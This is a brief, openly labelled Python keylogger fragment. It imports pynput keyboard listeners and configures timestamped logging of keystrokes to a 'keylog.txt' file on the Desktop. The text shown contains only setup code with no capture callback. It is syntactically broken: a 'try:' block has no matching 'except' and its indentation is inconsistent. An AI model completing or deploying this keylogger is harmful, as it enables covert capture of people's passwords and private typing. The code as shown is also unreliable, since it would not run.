#Keylogger by Urmil Shroff

try:
    from pynput.keyboard import Controller, Key, Listener
    import logging

log_dir="/Desktop/"

logging.basicConfig(filename=(log_dir+"keylog.txt"),level=logging.DEBUG, format='%(asctime)s: %(message)s')
